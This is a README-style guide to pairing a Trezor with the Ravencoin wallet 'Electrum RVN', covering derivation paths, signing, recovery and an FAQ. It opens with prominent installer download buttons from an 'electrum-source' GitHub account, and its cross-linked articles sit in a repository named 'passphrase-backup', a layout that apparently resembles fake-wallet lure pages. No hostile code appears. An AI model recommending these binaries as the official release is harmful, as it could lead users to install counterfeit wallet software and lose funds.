![Electrum RVN](assets/banner-article.png)

# Using a Trezor with Electrum RVN

<!-- compact-download-block -->

<p align="center">Signing on the device, broadcasting from the app</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
Connect the device, unlock it, and create a wallet in Electrum RVN that uses the Trezor to sign. The keys stay on the device, the wallet holds the addresses, and every spend is approved on the device screen. One decision matters more than the rest: the derivation path, which determines whether your balance appears at all.

## Pairing, step by step

1. **Install the wallet** from the releases page first: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0.
2. **Connect the Trezor** with a data-capable cable and unlock it with its PIN on the device.
3. **In the wallet, create a new wallet** and choose the hardware option. The wallet looks for a connected device.
4. **Approve the connection on the device** when prompted.
5. **Choose the wallet type**: standard, or watch-only if the device will live elsewhere - [watch-only wallets in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/watch-only-wallets-in-electrum-rvn.md).
6. **Select the derivation path.** This is the step that decides whether the balance shows.
7. **Verify an address** by displaying it on the device and comparing it with the wallet.

If the balance is zero after pairing, do not assume the funds are gone. Switch the derivation path and look again - [zero balance after restoring Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/zero-balance-after-restoring-electrum-rvn.md) explains the mechanism, and it applies to device-backed wallets as much as to seed restores.

## The derivation path decision

A seed derives addresses along a path, and different software has historically used different ones. The wallet offers the alternatives; the device is happy to sign for whichever you choose.

Two practical rules:

**If the device was set up for this coin by another wallet**, try that wallet's path first, and check the balance before doing anything else.

**If it is a fresh device**, use the wallet's default and write down which path you chose. A note on the same paper as the device's seed saves a confused hour in a year.

This is the single most common "my Trezor shows nothing" cause that is not a connection failure, and it is a setting, not a loss.

## Signing

1. Build the transaction: address, amount, fee.
2. Review the summary in the wallet.
3. **Confirm on the device**, reading the destination and amount on the device's own screen.
4. The wallet broadcasts the signed transaction.

The device screen is the trustworthy display. If it shows a different destination from the wallet, reject the transaction and investigate the machine.

## What the device protects

- **The seed**, which never enters the computer.
- **Signatures**, which cannot be produced without your approval on the device.
- **Address display**, which a compromised computer cannot alter.

What it does not protect: a transaction you approve without reading, a badly stored recovery phrase, or a device bought from somewhere other than the vendor.

## Keeping the pairing healthy

- **Close other suites.** A device held by another application is the most common detection failure - [Trezor not detected by Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/trezor-not-detected-by-electrum-rvn.md).
- **Use the cable that came with it**, directly into the machine.
- **Keep the device's firmware current** through the vendor's tooling.
- **Do not run two wallets against one device at the same time.**

If the connection helper your setup uses is not running or is out of date, the wallet may not see the device even though the cable is fine. That is a software-layers problem, not a broken device.

## The device and the rest of your setup

A single device is a good boundary for a moderate balance. For larger amounts, the stronger setups are:

- **multisig**, with one device per key and a threshold - [multisig wallets in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/multisig-wallets-in-electrum-rvn.md);
- **cold storage**, where the signing machine never touches a network - [electrum-rvn-cold-storage-workflow](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-cold-storage-workflow.md);
- **a watch-only wallet** on the everyday machine, so signing is a deliberate act rather than a habit.

Each of those builds on the same idea: the computer proposes, the key holder approves.

## If the device is lost or fails

The recovery phrase you wrote at setup is the wallet. Restore it onto a replacement device, or recover into software as a temporary measure and move the funds to a fresh seed - importing is a bridge, not a destination: [importing a hardware wallet seed into Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/import-a-hardware-wallet-seed-into-electrum-rvn.md).

The equivalent Ledger guide is [pairing a Ledger with Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/pairing-a-ledger-with-electrum-rvn.md), and the wider view of what protects what is [how safe is Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md).

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. Pair on that release, and check the device's own documentation for the coin support your model and firmware actually provide.

## FAQ

### Does Trezor support Ravencoin?

The wallet lists Trezor as a supported signing device, and the pairing is the one described here. If a particular model or firmware does not work, the wallet will not find it - check the device's own documentation for coin support.

### Why does the paired wallet show zero?

Most often the derivation path. Switch it and look again before concluding anything else.

### Do I need Trezor Suite installed?

You need whatever connection helper your setup requires; the vendor's software is how the device is set up and updated. The wallet itself does not replace it.

### Can I use the Trezor with two computers?

Yes, one at a time. Two wallets signing from one device simultaneously is a recipe for confusion, not a security feature.

### What happens if I lose the device?

Restore the recovery phrase onto a replacement device, or recover into software temporarily and then move to a fresh seed.

<!-- related-articles -->

## Related articles

- [Watch-Only Wallets in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/watch-only-wallets-in-electrum-rvn.md)
- [Zero Balance After Restoring Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/zero-balance-after-restoring-electrum-rvn.md)
- [Trezor Not Detected by Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/trezor-not-detected-by-electrum-rvn.md)
- [Multisig Wallets in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/multisig-wallets-in-electrum-rvn.md)
